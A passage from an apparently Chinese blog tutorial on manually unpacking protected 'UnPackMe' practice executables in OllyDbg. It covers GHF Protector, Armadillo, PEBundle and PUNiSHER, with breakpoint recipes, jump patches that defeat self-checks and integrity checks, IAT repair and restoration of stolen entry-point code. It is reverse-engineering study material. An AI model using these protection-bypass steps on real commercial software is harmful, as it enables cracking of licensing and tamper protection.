class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00456128  00000000</span><br><span class="line">0045612C  7C93135A  ntdll.RtlDeleteCriticalSection</span><br><span class="line">00456130  7C9210E0  ntdll.RtlLeaveCriticalSection</span><br></pre></td></tr></table></figure><p>脱壳后的程序没有弹出错误提示，双击“运行不了”的情况，大多数是程序有自校验的问题，它是运行了又退出了。</p><p>与7.6一样，在命令窗口输入<code>bp FindFirstFileA</code>（dll领空）下断避免后续程序跑飞。在命令窗口输入<code>bpx papa</code>，找到<code>EixtProcess</code>函数下断(因为7.6找不到这个函数，经过分析得出<code>__vbaNew2</code>调用退出函数)。</p><p>F9，运行到dll领空Alt+F9返回。再F9运行到达某个退出函数断点处。这是switch语句执行default时的代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">004523A6   &gt; \50            push eax                                 ;  Default case of switch 00451FB8</span><br><span class="line">004523A7   .  89D8          mov eax,ebx</span><br><span class="line">004523A9   .  29D8          sub eax,ebx</span><br><span class="line">004523AB   .  89C3          mov ebx,eax</span><br><span class="line">004523AD   .  89D8          mov eax,ebx</span><br><span class="line">004523AF   .  01D8          add eax,ebx</span><br><span class="line">004523B1   .  89C3          mov ebx,eax</span><br><span class="line">004523B3   .  58            pop eax</span><br><span class="line">004523B4   .  6A 00         push 0x0                                 ; /ExitCode = 0x0</span><br><span class="line">004523B6   .  E8 F540FBFF   call &lt;jmp.&amp;kernel32.#ExitProcess_183&gt;    ; \ExitProcess</span><br></pre></td></tr></table></figure><p>上下找一下发现只有<code>case 2E4E9</code>没有退出函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004523BB   &gt; \33C0          xor eax,eax                              ;  Case 2E4E9 of switch 00451FB8</span><br></pre></td></tr></table></figure><p>这个地址跳转来自很多，但只有一个是条件跳转<code>0045208C</code>，往上看在<code>00452085</code>下断点，重载运行几下运行发现可以停在这里。jg不要实现，因为我们想在je跳转。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00452085   &gt; \3D E9E40200   cmp eax,0x2E4E9</span><br><span class="line">0045208A   .  7F 6A         jg short dumped_.004520F6</span><br><span class="line">0045208C   .  0F84 29030000 je dumped_.004523BB</span><br></pre></td></tr></table></figure><p>修改一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0045208A      90            nop</span><br><span class="line">0045208B      90            nop</span><br><span class="line">0045208C      E9 2A030000   jmp dumped_.004523BB</span><br></pre></td></tr></table></figure><p>一路F8，在这又遇到了<code>2E4E9</code>，运行到jnz实现了，按道理它实现就不让它实现，nop掉。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00452775  |.  3D E9E40200   cmp eax,0x2E4E9</span><br><span class="line">0045277A  |.  75 0C         jnz short dumped_.00452788</span><br></pre></td></tr></table></figure><p>一路F8，又遇到了<code>2E4E9</code>，je要改为jmp，要不然就退出了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00452419  |.  3D E9E40200   cmp eax,0x2E4E9</span><br><span class="line">0045241E  |.  74 07         je short dumped_.00452427</span><br><span class="line">00452420  |.  6A 00         push 0x0                                 ; /ExitCode = 0x0</span><br><span class="line">00452422  |.  E8 8940FBFF   call &lt;jmp.&amp;kernel32.#ExitProcess_183&gt;    ; \ExitProcess</span><br><span class="line">00452427  |&gt;  33C0          xor eax,eax</span><br></pre></td></tr></table></figure><p>修改完这3处，程序正常运行。结果OD不能选择所有修改(我的原因)，那就修改一处保存一次重载新程序一次。</p><h2 id="7-8-GHF-Protector-V1-0"><a href="#7-8-GHF-Protector-V1-0" class="headerlink" title="7.8 GHF Protector V1.0"></a>7.8 GHF Protector V1.0</h2><p>脱壳的最佳时机：手动脱壳理想的最佳dump时机是指壳已经把程序代码包括资源等数据全部解密、输入表等数据还原但未填充系统函数地址、dll还没重定位，此时dump出来的文件只需修正OEP、ImportTableRVA等信息即可正常运行完成脱壳。</p><p>PEID查壳说是ASProtect 1.32的壳，但载入OD的壳特征明显不是ASProtect，并且程序的图标也被隐藏了。题目给了这是GHF Protector V1.0的壳。(可能不同程序入口代码不同)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00511709 &gt;  50              push eax</span><br><span class="line">0051170A    7C 05           jl short UnPackMe.00511711</span><br><span class="line">0051170C    52              push edx                                 ; ntdll.KiFastSystemCallRet</span><br><span class="line">0051170D    c1c4 80         rol esp,0x80</span><br><span class="line">00511710    5A              pop edx                                  ; kernel32.7C817077</span><br><span class="line">00511711    58              pop eax                                  ; kernel32.7C817077</span><br></pre></td></tr></table></figure><h3 id="7-8-1-最佳脱壳时机"><a href="#7-8-1-最佳脱壳时机" class="headerlink" title="7.8.1 最佳脱壳时机"></a>7.8.1 最佳脱壳时机</h3><p>在<code>M</code>模块，<code>.idata</code>下断，Shift+F9运行，F7、F8走到这，这里是最佳的脱壳时机。算是这个壳的一个特征，三个跳转指令，且有<code>0x80000000</code>和<code>0x7FFFFFFF</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">005114A2   /74 2A           je short UnPackMe.005114CE</span><br><span class="line">005114A4   |F7C2 00000080   test edx,0x80000000</span><br><span class="line">005114AA   |74 08           je short UnPackMe.005114B4</span><br><span class="line">005114AC   |81E2 FFFFFF7F   and edx,0x7FFFFFFF</span><br><span class="line">005114B2   |EB 04           jmp short UnPackMe.005114B8</span><br></pre></td></tr></table></figure><p>用PEtools半脱壳，设置PEtools选项：</p><img src="/posts/e2d652c5/GHF_PEtools.jpg" class="" title="GHF_PEtools"><p>或者用LoadPE半脱壳，在选项设置一下：</p><img src="/posts/e2d652c5/GHF_PE%E8%AE%BE%E7%BD%AE.png" class="" title="GHF_PE设置"><p>不要修正镜像大小，否则不能抓取进程。程序正常运行，但壳还没脱干净。</p><p>再将半脱壳后的程序载入OD，用ESP定律找到OEP。LoadPE脱壳，还原默认设置。</p><img src="/posts/e2d652c5/PE%E9%BB%98%E8%AE%A4.png" class="" title="PE默认"><p>importREC重建IAT，脱壳成功。</p><h3 id="7-8-2-使用LoadLibraryA"><a href="#7-8-2-使用LoadLibraryA" class="headerlink" title="7.8.2 使用LoadLibraryA"></a>7.8.2 使用LoadLibraryA</h3><p>在命令窗口输入<code>bp LoadLibraryA</code>回车，Shift+F9运行8次后，Alt+F9返回，取消断点，单步跟踪。(不知道为什么是8次)</p><p>到达这里，edx=00401700，是一个大跳转。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040729F  ^\FFE2            jmp edx</span><br></pre></td></tr></table></figure><p>F8到达OEP。</p><p>用LoadPE，按7.8.1设置PE选项，程序可以运行，但壳还没脱干净，重建IAT即可。如果按PE默认，PEID显示这不是一个有效的PE文件。</p><p>或者用PEtools，按如下设置，重建IAT就可成功运行。</p><img src="/posts/e2d652c5/GHF_PEtools.jpg" class="" title="GHF_PEtools"><h3 id="7-8-3-使用GlobalFree"><a href="#7-8-3-使用GlobalFree" class="headerlink" title="7.8.3 使用GlobalFree"></a>7.8.3 使用GlobalFree</h3><p>在命令窗口输入<code>bp GlobalFree</code>回车，Shift+F9，再Alt+F9，取消断点，单步跟踪也能去到OEP。</p><h2 id="7-9-Armadillo-穿山甲-6-04"><a href="#7-9-Armadillo-穿山甲-6-04" class="headerlink" title="7.9 Armadillo(穿山甲) 6.04"></a>7.9 Armadillo(穿山甲) 6.04</h2><p>穿山甲需要处理Magic jump，都有IAT加密。</p><h3 id="7-9-1-使用GetModuleHandleA-9-5"><a href="#7-9-1-使用GetModuleHandleA-9-5" class="headerlink" title="7.9.1 使用GetModuleHandleA+9/+5"></a>7.9.1 使用GetModuleHandleA+9/+5</h3><p>忽略所有异常，在StrongOD中勾选“跳过某些异常”。在命令窗口输入<code>bp GetModuleHandleA+9</code>下断，Shift+F9运行N次，直到堆栈窗口出现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">001293E4 /0012EB40</span><br><span class="line">001293E8 |00B88683 RETURN to 00B88683 from kernel32.GetModuleHandleA</span><br><span class="line">001293EC |00BB514C ASCII &quot;kernel32.dll&quot;</span><br><span class="line">001293F0 |00BB6D64 ASCII &quot;VirtualFree&quot;</span><br><span class="line">001293F4 |0EF6D207</span><br><span class="line">001293F8 |00454380 UnPackMe.00454380</span><br></pre></td></tr></table></figure><p>再Shift+F9一次，Alt+F9返回，单步到Magic Jump，将它nop掉。(我也不知道为什么这里是Magic Jump)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00B6AA13   /75 05           jnz short 00B6AA1A;nop</span><br></pre></td></tr></table></figure><p>往下拉到这里，F4运行到此处，再撤销刚才对Magic Jump的修改。因为穿山甲会检测某种保护下壳的完整性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00B6AC9A   /EB 03           jmp short 00B6AC9F</span><br></pre></td></tr></table></figure><p>接着再下第二个断点<code>bp CreateThread</code>，Shift+F9运行。再Alt+F9返回。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00B7614C    50              push eax</span><br><span class="line">00B7614D    FF15 9032BB00   call dword ptr ds:[0xBB3290]             ; kernel32.CloseHandle</span><br><span class="line">00B76153    5E              pop esi                                  ; UnPackMe.00454380</span><br></pre></td></tr></table></figure><p>单步跟踪到这，F7进入即可到达OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00B930E5    FFD2            call edx                                 ; UnPackMe.00401700</span><br></pre></td></tr></table></figure><p>或者不下第二个断点，在<code>M</code>模块的<code>.text</code>下断运行，单步跟踪到上面指令再F7进入OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00401700    55              push ebp</span><br><span class="line">00401701    8BEC            mov ebp,esp</span><br><span class="line">00401703    6A FF           push -0x1</span><br><span class="line">00401705    68 00254000     push UnPackMe.00402500</span><br><span class="line">0040170A    68 86184000     push UnPackMe.00401886</span><br></pre></td></tr></table></figure><p>常规脱壳即可。</p><h3 id="7-9-2-使用VirtualProtect"><a href="#7-9-2-使用VirtualProtect" class="headerlink" title="7.9.2 使用VirtualProtect"></a>7.9.2 使用VirtualProtect</h3><p>在命令窗口输入<code>bp VirtualProtect</code>，处理IAT加密。Shift+F9，注意寄存器ecx。当运行到ecx=00401000时，Alt+F9返回，取消断点。右键-&gt;查找-&gt;命令(Ctrl+F)，输入<code>push 100</code>，勾选“整个块”来到这里。(不勾选会找错地址，血的教训！)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00B42EC0    55              push ebp;修改为retn</span><br><span class="line">00B42EC1    8BEC            mov ebp,esp</span><br><span class="line">00B42EC3    83EC 2C         sub esp,0x2C</span><br><span class="line">00B42EC6    833D 20F6BB00 0&gt;cmp dword ptr ds:[0xBBF620],0x0</span><br><span class="line">00B42ECD    75 59           jnz short 00B42F28</span><br><span class="line">00B42ECF    C745 EC 13004BB&gt;mov dword ptr ss:[ebp-0x14],0xBA4B0013</span><br><span class="line">00B42ED6    68 00010000     push 0x100</span><br></pre></td></tr></table></figure><p>将第1行代码修改为<code>retn</code>，因为下面的代码是执行加密。</p><p>之后再下断点<code>bp CreateThread</code>或者去到<code>M</code>模块<code>.text</code>下断运行，单步跟踪同样去到OEP。 </p><h2 id="7-10-Armadillo-4-40"><a href="#7-10-Armadillo-4-40" class="headerlink" title="7.10 Armadillo 4.40"></a>7.10 Armadillo 4.40</h2><p>脱壳方法同7.9.1，<code>LoadLibraryA</code>下面的跳转就是magic jump？将它修改为<code>jmp</code>(什么时候修改为nop什么时候修改为nop？看它是否跳转？)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00AB5FE3    FF15 BC62AD00   call dword ptr ds:[0xAD62BC]             ; kernel32.LoadLibraryA</span><br><span class="line">00AB5FE9    8B0D AC40AE00   mov ecx,dword ptr ds:[0xAE40AC]</span><br><span class="line">00AB5FEF    89040E          mov dword ptr ds:[esi+ecx],eax</span><br><span class="line">00AB5FF2    A1 AC40AE00     mov eax,dword ptr ds:[0xAE40AC]</span><br><span class="line">00AB5FF7    391C06          cmp dword ptr ds:[esi+eax],ebx</span><br><span class="line">00AB5FFA    0F84 2F010000   je 00AB612F</span><br></pre></td></tr></table></figure><p>之后同7.9.1</p><p>用7.9.2方法好像不太可。</p><h2 id="7-11-PEBundle-2-0b5-3-0x"><a href="#7-11-PEBundle-2-0b5-3-0x" class="headerlink" title="7.11 PEBundle 2.0b5 - 3.0x"></a>7.11 PEBundle 2.0b5 - 3.0x</h2><p>用ESP定律找到OEP。脱壳后运行不了，但查壳没壳。考虑是importREC重建IAT时那些被我们剪切掉的指针是有用的，壳将它们加密了让我们以为那些指针没用。</p><p>随便找一个无效指针偏移地址为<code>5517C</code>，在OD重载，命令窗口输入<code>d 45517C</code>，在它上面一行(有效指针)下硬件访问断点。F8几下跑飞，但被我们下的硬件断点截住了。断点上面的地址已经出现系统函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0045516C  7C8101B1  kernel32.lstrcpynA</span><br><span class="line">00455170  7C801D53  kernel32.LoadLibraryExA</span><br><span class="line">00455174  7C80A4B5  kernel32.GetThreadLocale</span><br><span class="line">00455178  0005589E</span><br><span class="line">0045517C  000558B0</span><br></pre></td></tr></table></figure><p>F8走几下，发现这里是一个循环，并且<code>45517C</code>被加密。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">00471E14    8B19            mov ebx,dword ptr ds:[ecx]</span><br><span class="line">00471E16    83C1 04         add ecx,0x4</span><br><span class="line">00471E19    85DB            test ebx,ebx                             ; UnPackMe.004558C4</span><br><span class="line">00471E1B    74 33           je short UnPackMe.00471E50</span><br><span class="line">00471E1D    8BC3            mov eax,ebx                              ; UnPackMe.004558C4</span><br><span class="line">00471E1F    F7C3 00000080   test ebx,0x80000000</span><br><span class="line">00471E25    74 08           je short UnPackMe.00471E2F</span><br><span class="line">00471E27    81E3 FFFF0000   and ebx,0xFFFF</span><br><span class="line">00471E2D    EB 04           jmp short UnPackMe.00471E33</span><br><span class="line">00471E2F    43              inc ebx                                  ; UnPackMe.004558C4</span><br><span class="line">00471E30    43              inc ebx                                  ; UnPackMe.004558C4</span><br><span class="line">00471E31    03DA            add ebx,edx                              ; UnPackMe.00400000</span><br><span class="line">00471E33    51              push ecx                                 ; UnPackMe.00455184</span><br><span class="line">00471E34    52              push edx                                 ; UnPackMe.00400000</span><br><span class="line">00471E35    899D C2214000   mov dword ptr ss:[ebp+0x4021C2],ebx      ; UnPackMe.004558C4</span><br><span class="line">00471E3B    53              push ebx                                 ; UnPackMe.004558C4</span><br><span class="line">00471E3C    FFB5 BA214000   push dword ptr ss:[ebp+0x4021BA]         ; kernel32.7C800000</span><br><span class="line">00471E42    E8 32010000     call UnPackMe.00471F79</span><br><span class="line">00471E47    5A              pop edx                                  ; UnPackMe.00471DBC</span><br><span class="line">00471E48    59              pop ecx                                  ; UnPackMe.00471DBC</span><br><span class="line">00471E49    85C0            test eax,eax                             ; UnPackMe.0047214A</span><br><span class="line">00471E4B    74 05           je short UnPackMe.00471E52</span><br><span class="line">00471E4D    AB              stos dword ptr es:[edi]</span><br><span class="line">00471E4E  ^ EB C4           jmp short UnPackMe.00471E14</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00455178  7C801EF2  kernel32.GetStartupInfoA</span><br><span class="line">0045517C  00471F79  UnPackMe.00471F79</span><br></pre></td></tr></table></figure><p>再准确一点，程序运行完下面这条指令，<code>45517C</code>显示被加密。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00471E4D    AB              stos dword ptr es:[edi]</span><br></pre></td></tr></table></figure><p>STOS指令：是将AL/AX/EAX的值存储到[EDI]指定的内存单元中。</p><p>往上看最近的eax就是call产生的。所以这个call很可能是加密函数。跟进去，着重看寄存器eax。我们已知<code>455178</code>的函数没有被加密，程序运行到这一步，eax显示函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00471FBF    85C0            test eax,eax                                       ; kernel32.GetStartupInfoA</span><br><span class="line">00471FC1   /74 25           je short UnPackMe.00471FE8;没有实现</span><br></pre></td></tr></table></figure><p>到这一步eax显示为0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00471FDF    85C0            test eax,eax</span><br><span class="line">00471FE1   /74 02           je short UnPackMe.00471FE5;跳转实现</span><br></pre></td></tr></table></figure><p>一路到stos，函数出现在数据窗口。第二次循环就是我们要找的<code>45517C</code>的函数。进去到<code>471FBF</code>处，这已经显示了<code>45517C</code>未加密的系统函数<code>kernel32.GetProcAddress</code>，可以直接在import REC上修改。但我们需要将所有被加密的函数还原，不可能一个一个这样找，太麻烦了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00471FBF    85C0            test eax,eax                                       ; kernel32.GetProcAddress</span><br><span class="line">00471FC1   /74 25           je short UnPackMe.00471FE8;没有实现</span><br></pre></td></tr></table></figure><p>继续对比两者异同，到这一步eax显示的是加密函数<code>UnPackMe.00471F79</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00471FDF    85C0            test eax,eax                                       ; UnPackMe.00471F79</span><br><span class="line">00471FE1    74 02           je short UnPackMe.00471FE5;没有实现</span><br></pre></td></tr></table></figure><p>在<code>471FE1</code>处，未加密函数跳转实现而加密函数跳转未实现，所以应该将<code>471FE1</code>处的跳转改为<code>jmp</code>。继续单步观察数据窗口，验证修改是否正确。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00455178  7C801EF2  kernel32.GetStartupInfoA</span><br><span class="line">0045517C  7C80AE40  kernel32.GetProcAddress</span><br></pre></td></tr></table></figure><p>复制到可执行文件，将新的程序载入OD寻找OEP，脱壳，没有无效指针，程序成功运行。</p><h2 id="7-12-PUNiSHER-1-5"><a href="#7-12-PUNiSHER-1-5" class="headerlink" title="7.12 PUNiSHER 1.5"></a>7.12 PUNiSHER 1.5</h2><p>这个壳比较特殊，下面用原版OD进行破解。首先忽略所有异常，隐藏好OD。Options -&gt; Debugging options -&gt; Exceptions，全选。</p><p>载入OD，程序停在此处。在命令行下断<code>bp LoadLibraryA+5</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00408061 &gt; /EB 04           jmp short UnPackMe.00408067</span><br><span class="line">00408063   |83A4BC CE60EB04&gt;and dword ptr ss:[esp+edi*4+0x4EB60CE],0&gt;</span><br><span class="line">0040806B    BC 0411E800     mov esp,0xE81104</span><br></pre></td></tr></table></figure><p>Shift + F9运行程序，查看堆栈变化，第一次：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0012FF98   FFFEBDA9</span><br><span class="line">0012FF9C   004083EC  RETURN to UnPackMe.004083EC</span><br><span class="line">0012FFA0   0040821F  ASCII &quot;USER32.DLL&quot;</span><br><span class="line">0012FFA4   005E5918</span><br></pre></td></tr></table></figure><p>Shift + F9第二次，已经看到<code>LoadLibraryA</code>了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0012E9B4  /0012EA5C</span><br><span class="line">0012E9B8  |73FBE2BF  RETURN to usp10.73FBE2BF from kernel32.LoadLibraryA</span><br><span class="line">0012E9BC  |73FA1840  ASCII &quot;gdi32.dll&quot;</span><br><span class="line">0012E9C0  |73FBE4B9  usp10.&lt;ModuleEntryPoint&gt;</span><br></pre></td></tr></table></figure><p>再Shift + F9一次，此时为我们的最佳返回时机。Alt + F9返回：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0012FF98   FFFA31E5</span><br><span class="line">0012FF9C   003C0470  RETURN to 003C0470</span><br><span class="line">0012FFA0   003C00B7  ASCII &quot;USER32.DLL&quot;</span><br><span class="line">0012FFA4   005E5918</span><br></pre></td></tr></table></figure><p>取消断点，F8单步，遇到向上跳转时忽略，继续往下。直到去到<code>003C08C5</code>处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">003C08C5    8D85 ADD64100   lea eax,dword ptr ss:[ebp+0x41D6AD]</span><br><span class="line">003C08CB    870424          xchg dword ptr ss:[esp],eax              ; UnPackMe.00402494</span><br><span class="line">003C08CE    FF95 E1CE4100   call dword ptr ss:[ebp+0x41CEE1]         ; kernel32.OutputDebugStringA</span><br><span class="line">003C08D4    80BD E9CE4100 0&gt;cmp byte ptr ss:[ebp+0x41CEE9],0x0</span><br></pre></td></tr></table></figure><p>此时，信息窗口显示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Address=003C0892, (ASCII &quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;)</span><br><span class="line">eax=00402494 (UnPackMe.00402494)</span><br></pre></td></tr></table></figure><p>把上面的汇编代码前两行NOP掉，避免产生溢出错误。继续往下，来到两个连续的jmp指令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">003C0B1C  ^\EB BF           jmp short 003C0ADD;不跳转</span><br><span class="line">003C0B1E  ^ E9 36FEFFFF     jmp 003C0959;跳转</span><br></pre></td></tr></table></figure><p>第一个jmp指令不跳，第二个jmp指令跳转。跳转后继续单步，看到大跳转了，跳过去就是Stolen Code的开始处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">003C0959    8B85 EACE4100   mov eax,dword ptr ss:[ebp+0x41CEEA]</span><br><span class="line">003C095F    8D9D FEDC4100   lea ebx,dword ptr ss:[ebp+0x41DCFE]</span><br><span class="line">003C0965    50              push eax</span><br><span class="line">003C0966    E8 0E000000     call 003C0979</span><br><span class="line">003C096B    50              push eax</span><br><span class="line">003C096C    53              push ebx                                 ; UnPackMe.00400000</span><br><span class="line">003C096D    E8 8EF7FFFF     call 003C0100</span><br><span class="line">003C0972    83C4 08         add esp,0x8</span><br><span class="line">003C0975  - FF6424 FC       jmp dword ptr ss:[esp-0x4]</span><br><span class="line">003C0979    60              pushad</span><br><span class="line">003C097A    EB 04           jmp short 003C0980</span><br></pre></td></tr></table></figure><p>跳过去是jmp指令，继续F8找到熟悉的VC程序入口，遇到近call要F7跟进去。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">009F0000   /EB 04           jmp short 009F0006</span><br><span class="line">009F0002   |8182 8241D9EE E&gt;add dword ptr ds:[edx+0xEED94182],0x8C83&gt;</span><br><span class="line">009F000C    8C82 DB5C24FC   mov word ptr ds:[edx+0xFC245CDB],es</span><br><span class="line">009F0012    EB 04           jmp short 009F0018</span><br></pre></td></tr></table></figure><p>来到这儿时，终于看到被抽取代码的了，VC程序入口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">009F022D    90              nop</span><br><span class="line">009F022E    64:A1 00000000  mov eax,dword ptr fs:[0]</span><br><span class="line">009F0234    50              push eax</span><br><span class="line">009F0235    64:8925 0000000&gt;mov dword ptr fs:[0],esp</span><br><span class="line">009F023C    83EC 68         sub esp,0x68</span><br><span class="line">009F023F    53              push ebx</span><br><span class="line">009F0240    56              push esi                                 ; UnPackMe.00404038</span><br><span class="line">009F0241    57              push edi                                 ; UnPackMe.00407B90</span><br><span class="line">009F0242    8965 E8         mov dword ptr ss:[ebp-0x18],esp</span><br><span class="line">009F0245    33DB            xor ebx,ebx</span><br><span class="line">009F0247    895D FC         mov dword ptr ss:[ebp-0x4],ebx</span><br></pre></td></tr></table></figure><p>但是前面还缺少了55开头的OEP，此时堆栈前2行就是第4、第5行push的地址。自行补上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp esp</span><br><span class="line">push -1</span><br><span class="line">push 004023D0</span><br><span class="line">push 00401616</span><br></pre></td></tr></table></figure><p>继续找被抽取的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">009F02B7    90              nop</span><br><span class="line">009F02B8    FF15 7C214000   call dword ptr ds:[0x40217C]             ; msvcrt.__set_app_type</span><br><span class="line">009F02BE    59              pop ecx</span><br><span class="line">009F02BF    830D 3C314000 F&gt;or dword ptr ds:[0x40313C],0xFFFFFFFF</span><br><span class="line">009F02C6    830D 40314000 F&gt;or dword ptr ds:[0x403140],0xFFFFFFFF</span><br><span class="line">009F02CD    FF15 78214000   call dword ptr ds:[0x402178]             ; msvcrt.__p__fmode</span><br><span class="line">009F02D3    8B0D 30314000   mov ecx,dword ptr ds:[0x403130]</span><br><span class="line">009F02D9    8908            mov dword ptr ds:[eax],ecx</span><br><span class="line">009F02DB    FF15 74214000   call dword ptr ds:[0x402174]             ; msvcrt.__p__commode</span><br><span class="line">009F02E1    8B0D 2C314000   mov ecx,dword ptr ds:[0x40312C]</span><br><span class="line">009F02E7    